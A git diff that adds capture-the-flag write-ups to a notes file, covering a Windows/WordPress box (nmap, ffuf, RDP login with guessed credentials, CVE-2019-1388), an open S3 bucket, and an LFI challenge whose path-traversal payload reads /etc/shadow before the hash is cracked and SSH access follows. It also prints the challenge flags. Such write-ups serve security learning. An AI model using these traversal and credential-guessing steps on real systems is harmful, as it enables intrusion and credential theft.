@@ -382,16 +382,74 @@ cat note2_plaintext.txt
 ## Accumulate
 
 ```shell
+#we are given a vulnerable box, we have to get flag
+nmap -T4 -p- -A 10.10.71.247
+#shows that website uses microsoft iis
+
+ffuf -u 'http://10.10.71.247/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s
+#gives hidden directory /retro
+#website by wade
+
+ffuf -u 'http://10.10.71.247/retro/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s
+#gives /wp-content, /wp-includes, /wp-admin
+
+#furthermore, one of the blog comments include the word 'parzival'
+#we can try the creds wade:parzival to login to system using rdp
+
+#install freerdp
+sudo apt install freerdp2-x11 freerdp2-shadow-x11
+
+#use freerdp to connect remotely
+xfreerdp /u:wade /p:parzival /v:10.10.71.247
+
+#this gives us access to desktop
+#user.txt - THM{HACK_PLAYER_ONE}
+
+#the desktop contains a file called hhupd
+#searching hhupd gives us some CVE websites and a demonstration of exploit
+#CVE-2019-1388
+#once we get root access, flag can be viewed in Desktop through cmd
+#root.txt - THM{COIN_OPERATED_EXPLOITATION}
 ```
 
 ## Unknown Storage
 
-```shell
+```markdown
+This challenge is about insecure cloud storage.
+
+We are given a bucket name 'advent-bucket-one'; we have to find more information about it.
+
+Now, we know that the format of the URL for S3 bucket is bucketname.s3.amazonaws.com; these can be accessed through regions as well, using bucketname.region-name.amazonaws.com
+
+On accessing the link advent-bucket-one.s3.amazonaws.com, we get the XML structure for a file named employee_names.txt
+
+We can download the objects from S3 buckets by using AWS CLI
+
+To check contents of bucket - aws s3 ls s3://bucket-name
+
+To download files - aws s3 cp s3://bucket-name/file-name local-location
+
+We do not need to use the AWS CLI here; we can simply go to /employee_names.txt and we get our flag 'mcchef'.
 ```
 
 ## LFI
 
-```shell
+```markdown
+We have to use Local File Inclusion to get the flag.
+
+On accessing the website, we get to know from Charlie's notes that he is going to book holiday to Hawaii.
+
+From the source code of the website, we know that /get-file/ is used to access file here, so we can use that for LFI.
+
+We also know that the forward slash will have to be decoded as %2F
+
+So we attempt to enter %2Fetc%2Fshadow, and each time we do not get access, we add prefix ..%2F to move a directory up.
+
+Eventually, ..%2F..%2F..%2Fetc%2Fshadow gives us access to /etc/shadow, where we get Charlie's hash.
+
+It can be cracked using Hashcat, and the password is 'password1'.
+
+We can use ssh to login into charlie's account using the above password, and we get the flag.
 ```
 
 ## File Confusion
